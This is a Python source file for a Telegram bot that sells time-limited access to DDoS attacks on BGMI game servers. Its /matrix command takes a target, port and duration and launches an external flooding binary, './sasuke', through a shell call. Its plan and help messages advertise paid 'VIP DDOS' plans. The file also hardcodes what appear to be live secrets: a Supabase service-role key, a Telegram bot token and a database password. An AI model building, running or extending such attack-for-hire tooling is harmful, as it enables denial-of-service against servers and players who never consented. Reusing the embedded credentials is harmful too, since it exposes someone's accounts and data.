#!/usr/bin/python3
# MADE BY @its_MATRIX_king
import telebot
import multiprocessing
import os
import random
from datetime import datetime, timedelta
import subprocess
import sys
import time 
import logging
import socket
import pytz  # Import pytz for timezone handling
from supabase import create_client, Client
import psycopg2
import threading
import re

admin_id = ["7418099890"]
admin_owner = ["7418099890"]
os.system('chmod +x *')

import os
url = os.getenv("https://yxffpwhflqaapiwcpknf.supabase.co")
key = os.getenv("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl4ZmZwd2hmbHFhYXBpd2Nwa25mIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTczMjI3MzI5MywiZXhwIjoyMDQ3ODQ5MjkzfQ.WbVl0CoK25HVrFzchTnD7-AI-lPH8l_Vb1MbLQKT5NQ")

# Supabase credentials (replace with your actual credentials)
url = "https://yxffpwhflqaapiwcpknf.supabase.co"  # Supabase project URL
key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl4ZmZwd2hmbHFhYXBpd2Nwa25mIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTczMjI3MzI5MywiZXhwIjoyMDQ3ODQ5MjkzfQ.WbVl0CoK25HVrFzchTnD7-AI-lPH8l_Vb1MbLQKT5NQ"  # Supabase anonymous API key
supabase: Client = create_client(url, key)

bot = telebot.TeleBot('7858493439:AAEDGY4WNmZkDHMFwwUbarXWmO3GXc8rB2s')

# Setup timezone (IST)
IST = pytz.timezone('Asia/Kolkata')

# Database connection details
connection = psycopg2.connect(
    host="aws-0-ap-south-1.pooler.supabase.com",
    database="postgres",
    user="postgres.yxffpwhflqaapiwcpknf",
    password="Uthaya$4123",
    port=6543
)
cursor = connection.cursor()

USER_TABLE = "users"  # Replace with your actual table name

from datetime import datetime
import pytz

# Set up the timezone (Asia/Kolkata)
IST = pytz.timezone('Asia/Kolkata')

def save_user(user_id, expiration_time):
    try:
        expiration_time_str = expiration_time.strftime("%Y-%m-%d %H:%M:%S")
        cursor.execute(f"INSERT INTO {USER_TABLE} (user_id, expiration_time) VALUES (%s, %s)", (user_id, expiration_time_str))
        connection.commit()
    except Exception as e:
        logging.error(f"Error saving user {user_id}: {e}")
        connection.rollback()

# Function to read users from the database
def read_users():
    cursor.execute(f"SELECT user_id, expiration_time FROM {USER_TABLE}")
    users = cursor.fetchall()
    
    # Convert expiration_time to datetime and return a dictionary of users
    user_dict = {}
    for user_id, expiration_time in users:
        # Ensure expiration_time is timezone-aware
        if expiration_time.tzinfo is None:  # Check if naive (no timezone)
            expiration_time = IST.localize(expiration_time)  # Localize it to IST
        
        user_dict[user_id] = expiration_time
    return user_dict

# Handler for removing a user
def remove_expired_users():
    current_time = datetime.now(IST)  # Get the current time in IST
    try:
        # Delete users whose expiration time has passed
        cursor.execute(f"DELETE FROM {USER_TABLE} WHERE expiration_time < %s", (current_time.strftime("%Y-%m-%d %H:%M:%S"),))
        connection.commit()
    except Exception as e:
        logging.error(f"Error while removing expired users: {e}")
        print(f"Error while removing expired users: {e}")
        connection.rollback()  # Rollback the transaction on error

# Periodically check and remove expired users
def periodic_expiration_check(interval=60):
    while True:
        remove_expired_users()
        time.sleep(interval)

# Start periodic expiration check in a background thread
def start_periodic_expiration_check():
    expiration_thread = threading.Thread(target=periodic_expiration_check, args=(60,), daemon=True)
    expiration_thread.start()

# Call the function to start periodic expiration checks when the script is executed
start_periodic_expiration_check()
# Handler for adding a user
def parse_time_input(time_input):
    # Use regex to extract the number and unit (e.g., 1m, 2h, 3d)
    match = re.match(r"(\d+)([mhd])", time_input)
    if match:
        number = int(match.group(1))
        unit = match.group(2)

        if unit == "m":
            return timedelta(minutes=number)
        elif unit == "h":
            return timedelta(hours=number)
        elif unit == "d":
            return timedelta(days=number)
    return None

@bot.message_handler(commands=['add'])
def add_user(message):
    try:
        user_id = str(message.chat.id)

        if user_id in admin_owner:
            command = message.text.split()

            if len(command) == 3:
                user_to_add = command[1]
                time_input = command[2]

                # Parse the time input
                time_delta = parse_time_input(time_input)
                
                if time_delta:
                    # Calculate expiration time
                    expiration_time = datetime.now(IST) + time_delta
                    save_user(user_to_add, expiration_time)

                    response = (f"User {user_to_add} added successfully.\n"
                                f"Access valid for {time_input} (Expires at: {expiration_time.strftime('%Y-%m-%d %H:%M:%S')} IST).")
                else:
                    response = "Error: Please specify a valid time format (e.g., 1m, 2h, 3d)."
            else:
                response = "Usage: /add <user_id> <time_in_format_m/h/d>"
        else:
            response = "Only Admin Can Run This Command."
        
        bot.reply_to(message, response)

    except Exception as e:
        logging.error(f"Error in /add command: {e}")
        bot.reply_to(message, "An error occurred while processing your request. Please try again.")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    try:
        user_id = str(message.chat.id)

        if user_id in admin_owner:
            command = message.text.split()

            if len(command) == 2:
                user_to_remove = command[1]

                # Remove the user from the database
                cursor.execute(f"DELETE FROM {USER_TABLE} WHERE user_id = %s", (user_to_remove,))
                connection.commit()

                response = f"User {user_to_remove} has been removed successfully."
            else:
                response = "Usage: /remove <user_id>"
        else:
            response = "Only Admin Can Run This Command."

        bot.reply_to(message, response)

    except Exception as e:
        logging.error(f"Error in /remove command: {e}")
        bot.reply_to(message, "An error occurred while processing your request. Please try again.")


@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_owner:
        users = read_users()  # Fetch from Supabase
        response = "Authorized Users:\n"
        current_time = datetime.now(IST)

        active_users = [
            user_id for user_id, exp_time in users.items() if exp_time > current_time
        ]

        if active_users:
            for user_id in active_users:
                response += f"- {user_id} (Expires at: {users[user_id]})\n"
        else:
            response = "No active users found."
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)
        
@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

#Store ongoing attacks globally
ongoing_attacks = []

def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name

    # Track the ongoing attack
    ongoing_attacks.append({
        'user': username,
        'target': target,
        'port': port,
        'time': time,
        'start_time': datetime.now(IST)
    })

    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBY @its_MATRIX_King"
    bot.reply_to(message, response)

    full_command = f"./sasuke {target} {port} {time} 60"
    try:
        print(f"Executing command: {full_command}")  # Log the command
        result = subprocess.run(full_command, shell=True, capture_output=False, text=True)
        
        # Remove attack from ongoing list once finished
        ongoing_attacks.remove({
            'user': username,
            'target': target,
            'port': port,
            'time': time,
            'start_time': ongoing_attacks[-1]['start_time']
        })
        
        if result.returncode == 0:
            bot.reply_to(message, f"BGMI Attack Finished \nBY @its_Matrix_King.\nOutput: {result.stdout}")
        else:
            bot.reply_to(message, f"Error in BGMI Attack.\nError: {result.stderr}")
    except Exception as e:
        bot.reply_to(message, f"Exception occurred while executing the command.\n{str(e)}")

        
@bot.message_handler(commands=['status'])
def show_status(message):
    user_id = str(message.chat.id)
    if user_id in admin_owner or user_id in read_users():
        response = "Ongoing Attacks:\n\n"
        if ongoing_attacks:
            for attack in ongoing_attacks:
                response += (f"User: {attack['user']}\nTarget: {attack['target']}\nPort: {attack['port']}\n"
                             f"Time: {attack['time']} seconds\n"
                             f"Started at: {attack['start_time'].strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        else:
            response += "No ongoing attacks currently."

        bot.reply_to(message, response)
    else:
        bot.reply_to(message, "You are not authorized to view the status.")
        
# Global dictionary to track cooldown times for users
bgmi_cooldown = {}

@bot.message_handler(commands=['matrix'])
def handle_matrix(message):
    remove_expired_users()  # Check for expired users
    user_id = str(message.chat.id)
    
    users = read_users()
    command = message.text.split()
    
    # Initialize response to a default value
    response = "You Are Not Authorized To Use This Command.\nMADE BY @its_MATRIX_king"

    # Check if the user has any ongoing attacks
    if ongoing_attacks:
        response = "An attack is currently in progress. Please wait until it completes before starting a new one."
    elif user_id in admin_owner or user_id in users:
        if user_id in admin_owner:
            # Admin owner can bypass cooldown
            if len(command) == 4:  # Ensure proper command format (no threads argument)
                try:
                    target = command[1]
                    port = int(command[2])  # Convert port to integer
                    time = int(command[3])  # Convert time to integer

                    if time > 180:
                        response = "Error: Time interval must be 180 seconds or less"
                    else:
                        # Start the attack without setting a cooldown for admin owners
                        start_attack_reply(message, target, port, time)
                        return  # Early return since response is handled in start_attack_reply
                except ValueError:
                    response = "Error: Please ensure port and time are integers."
            else:
                response = "Usage: /matrix <target> <port> <time>"
        else:
            # Non-admin users, check if they are within the cooldown period
            if user_id in bgmi_cooldown:
                cooldown_expiration = bgmi_cooldown[user_id]
                current_time = datetime.now(pytz.timezone('Asia/Kolkata'))  # Get current time in IST
                if current_time < cooldown_expiration:
                    time_left = (cooldown_expiration - current_time).seconds
                    response = f"You need to wait {time_left} seconds before using the /matrix command again."
                else:
                    # Cooldown has expired, proceed with the command
                    if len(command) == 4:  # Ensure proper command format (no threads argument)
                        try:
                            target = command[1]
                            port = int(command[2])  # Convert port to integer
                            time = int(command[3])  # Convert time to integer

                            if time > 180:
                                response = "Error: Time interval must be 180 seconds or less"
                            else:
                                # Start the attack and set the new cooldown
                                start_attack_reply(message, target, port, time)
                                bgmi_cooldown[user_id] = datetime.now(pytz.timezone('Asia/Kolkata')) + timedelta(minutes=5)
                                return  # Early return since response is handled in start_attack_reply
                        except ValueError:
                            response = "Error: Please ensure port and time are integers."
                    else:
                        response = "Usage: /matrix <target> <port> <time>"
            else:
                # User not in cooldown, proceed with the command
                if len(command) == 4:  # Ensure proper command format (no threads argument)
                    try:
                        target = command[1]
                        port = int(command[2])  # Convert port to integer
                        time = int(command[3])  # Convert time to integer

                        if time > 180:
                            response = "Error: Time interval must be 180 seconds or less"
                        else:
                            # Start the attack and set the new cooldown
                            start_attack_reply(message, target, port, time)
                            bgmi_cooldown[user_id] = datetime.now(pytz.timezone('Asia/Kolkata')) + timedelta(minutes=5)
                            return  # Early return since response is handled in start_attack_reply
                    except ValueError:
                        response = "Error: Please ensure port and time are integers."
                else:
                    response = "Usage: /matrix <target> <port> <time>"

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    try:
        user_id = str(message.chat.id)

        # Basic help text for all users
        help_text = '''Available Commands:
    - /matrix : Execute a BGMI server attack (specific conditions apply).
    - /rulesanduse : View usage rules and important guidelines.
    - /plan : Check available plans and pricing for the bot.
    - /status : View ongoing attack details.
    - /id : Retrieve your user ID.
    '''

        # Check if the user is an admin and append admin commands
        if user_id in admin_id:
            help_text += '''
Admin Commands:
    - /add <user_id> <time_in_minutes> : Add a user with specified time.
    - /remove <user_id> : Remove a user from the authorized list.
    - /allusers : List all authorized users.
    - /broadcast : Send a broadcast message to all users.
    '''

        # Footer with channel and owner information
        help_text += ''' 
JOIN CHANNEL - @MATRIX_CHEATS
BUY / OWNER - @its_MATRIX_King
'''

        # Send the constructed help text to the user
        bot.reply_to(message, help_text)
    
    except Exception as e:
        logging.error(f"Error in /help command: {e}")
        bot.reply_to(message, "An error occurred while fetching help. Please try again.")
    
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"Welcome to Our BOT, {user_name}\nRun This Command : /help\nJOIN CHANNEL - @MATRIX_CHEATS\nBUY / OWNER - @its_MATRIX_King "
    bot.reply_to(message, response)

@bot.message_handler(commands=['rulesanduse'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules:

1. Time Should Be 180 or Below
2. Click /status Before Entering Match
3. If There Are Any Ongoing Attacks You Cant use Wait For Finish
JOIN CHANNEL - @MATRIX_CHEATS
BUY / OWNER - @its_MATRIX_King '''
   
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 
    Purchase VIP DDOS Plan From @its_Matrix_King
    Join Channel @MATRIX_CHEATS
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_id = str(message.chat.id)

    # Check if user is in owners.txt
    with open('owner.txt', "r") as file:
        owners = file.read().splitlines()

    if user_id in owners:
        user_name = message.from_user.first_name
        response = f'''{user_name}, Admin Commands Are Here!!:

        /add <userId> : Add a User.
        /remove <userId> : Remove a User.
        /allusers : Authorized Users List.
        /broadcast : Broadcast a Message.
        Channel - @MATRIX_CHEATS
        Owner/Buy - @its_Matrix_King
        '''
        bot.reply_to(message, response)
    else:
        response = "You do not have permission to access admin commands."
        bot.reply_to(message, response)


# Handler for broadcasting a message
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_owner:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            users = read_users()  # Get users from Redis
            if users:
                for user in users:
                    try:
                        bot.send_message(user, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user}: {str(e)}")
                response = "Broadcast Message Sent Successfully To All Users."
            else:
                response = "No users found in the system."
        else:
            response = "Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

def run_bot():
    while True:
        try:
            print("Bot is running...")
            bot.polling(none_stop=True, timeout=60)  # Add timeout to prevent long idle periods
        except Exception as e:
            logging.error(f"An error occurred: {e}")
            print(f"An error occurred: {e}")
            time.sleep(15)  # Sleep before restarting the bot

if __name__ == "__main__":
    run_bot()
